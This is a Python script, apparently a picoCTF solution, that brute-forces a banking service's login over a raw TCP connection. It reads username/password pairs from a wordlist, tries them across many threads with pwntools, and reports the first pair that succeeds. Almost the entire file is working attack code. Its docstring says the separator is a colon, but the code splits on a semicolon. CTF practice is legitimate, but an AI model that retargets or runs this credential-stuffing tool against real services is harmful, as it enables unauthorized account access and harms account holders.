#!/usr/bin/env python3
"""
Multithreaded credential bruteforcer for picoCTF banking service.
Uses pwntools for connection handling + threading for speed.
Reads a file with lines in the format:  username:password
"""

import sys
import time
import argparse
import threading
from queue import Queue, Empty
from pwn import remote, context

HOST = "crystal-peak.picoctf.net"
PORT = 65109

context.log_level = "error"  # Suppress pwntools noise

# Shared state
found_event = threading.Event()
found_creds = {}
print_lock = threading.Lock()
counter_lock = threading.Lock()
attempted = 0


def read_credentials(filepath: str) -> list[tuple[str, str]]:
    creds = []
    with open(filepath, "r") as f:
        for lineno, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ";" not in line:
                print(f"[!] Line {lineno} skipped (no ';' separator): {line!r}")
                continue
            username, password = line.split(";", 1)
            creds.append((username.strip(), password.strip()))
    return creds


def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)


def try_login(username: str, password: str, verbose: bool = False) -> tuple[bool, str]:
    conn = remote(HOST, PORT)
    try:
        conn.recvuntil(b"Username:")
        conn.sendline(username.encode())
        conn.recvuntil(b"Password:")
        conn.sendline(password.encode())
        response = conn.recvall(timeout=3).decode(errors="replace")

        if verbose:
            safe_print(f"  [{threading.current_thread().name}] {username}:{password} -> {response.strip()!r}")

        failed = any(kw in response.lower() for kw in [
            "invalid", "incorrect", "failed", "denied", "wrong"
        ])
        return (not failed, response)
    except EOFError:
        return (False, "")
    finally:
        conn.close()


def worker(queue: Queue, total: int, verbose: bool, delay: float):
    global attempted
    while not found_event.is_set():
        try:
            user, pwd = queue.get(timeout=1)
        except Empty:
            break

        try:

            success, response = try_login(user, pwd, verbose=verbose)

            with counter_lock:
                attempted += 1
                current = attempted

            if success and not found_event.is_set():
                found_event.set()
                found_creds["username"] = user
                found_creds["password"] = pwd
                found_creds["response"] = response
                safe_print(f"\r  ✅  [{current}/{total}] FOUND: {user}:{pwd}          ")
            elif not success and not verbose:
                safe_print(f"\r  ❌  [{current}/{total}] {user}:{pwd}          ", end="")

            if delay > 0:
                time.sleep(delay)
        finally:
            queue.task_done()


def main():
    parser = argparse.ArgumentParser(
        description="Multithreaded bruteforcer for picoCTF Online Banking (pwntools)"
    )
    parser.add_argument("wordlist", help="Path to credentials file (user:pass per line)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Print full server I/O for each attempt")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Number of concurrent threads (default: 10)")
    parser.add_argument("-d", "--delay", type=float, default=0.0,
                        help="Delay per thread between attempts in seconds (default: 0)")
    args = parser.parse_args()

    creds = read_credentials(args.wordlist)
    if not creds:
        print("[!] No valid credentials found in file. Exiting.")
        sys.exit(1)

    total = len(creds)
    print(f"[*] Loaded {total} credential pair(s) from '{args.wordlist}'")
    print(f"[*] Target  : {HOST}:{PORT}")
    print(f"[*] Threads : {args.threads}")

    print(f"[*] Delay   : {args.delay}s\n")

    # Fill the queue
    queue = Queue()
    for cred in creds:
        queue.put(cred)

    start = time.time()

    # Launch threads
    threads = []
    for i in range(min(args.threads, total)):
        t = threading.Thread(
            target=worker,
            args=(queue, total, args.verbose, args.delay),
            name=f"T{i+1}",
            daemon=True
        )
        t.start()
        threads.append(t)

    # Wait for all threads or until found
    for t in threads:
        t.join()

    elapsed = time.time() - start
    print()  # newline after progress line

    if found_event.is_set():
        print(f"\n{'='*45}")
        print(f"  ✅  VALID CREDENTIALS FOUND")
        print(f"  Username : {found_creds['username']}")
        print(f"  Password : {found_creds['password']}")
        print(f"{'='*45}")
        print(f"\nServer response:\n{found_creds['response'].strip()}\n")
        print(f"[*] Finished in {elapsed:.2f}s ({attempted} attempts)")
        sys.exit(0)
    else:
        print(f"[!] All {total} credentials exhausted. No valid login found.")
        print(f"[*] Finished in {elapsed:.2f}s")
        sys.exit(1)


if __name__ == "__main__":
    main()
